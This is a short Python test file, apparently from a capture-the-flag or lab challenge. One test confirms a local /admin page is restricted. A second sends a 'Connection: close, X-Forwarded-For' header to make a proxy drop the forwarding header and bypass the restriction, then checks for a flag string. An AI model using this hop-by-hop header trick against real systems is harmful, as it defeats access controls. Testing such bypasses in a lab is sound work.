import requests

def test_basecase():
    resp = requests.get("http://localhost:81/admin")
    if resp.text.find("Admin Computers only") > -1:
         assert True
    else:
        assert False

def test_bypass():
    headers = {"Connection": "close, X-Forwarded-For"}
    resp = requests.get("http://localhost:81/admin", headers=headers)
    if resp.text.find("2227DF03559A4C4E1173BF3565964FD3") > -1:
         assert True
    else:
        assert False
